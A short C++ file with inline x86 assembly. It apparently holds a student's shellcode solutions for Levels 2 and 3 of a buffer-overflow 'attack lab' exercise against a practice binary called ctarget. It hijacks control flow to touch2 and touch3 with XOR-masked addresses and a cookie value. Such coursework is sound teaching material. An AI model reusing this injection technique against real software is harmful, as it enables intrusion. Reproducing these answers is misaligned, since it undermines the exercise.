// ShellcodeExtract.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

int main()
{
    __asm int 3
    // Shellcode for ctarget: Level 2.
    __asm {
        mov edi, 440453A8h  ; 004017EC ^ 44444444 = 440453A8
        xor edi, 44444444h  ; Now, edi = 004017EC, which is the address of touch2.
        push edi            ; Push it to the top of the stack. 
        mov edi, 59B997FAh  ; Set val equal to cookie.
        ret                 ; Call touch2.
    }
    __asm int 3
    // Shellcode for ctarget: Level 3.
    __asm {
        mov edi, 44045CBEh
        xor edi, 44444444h
        push edi            ; Push the address of touch3(004018FA).
        mov edi, esp
        add edi, 8          ; Now, edi points to the top of the stack frame of function test.
        ret
    }
    return 0;
}

// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门使用技巧: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
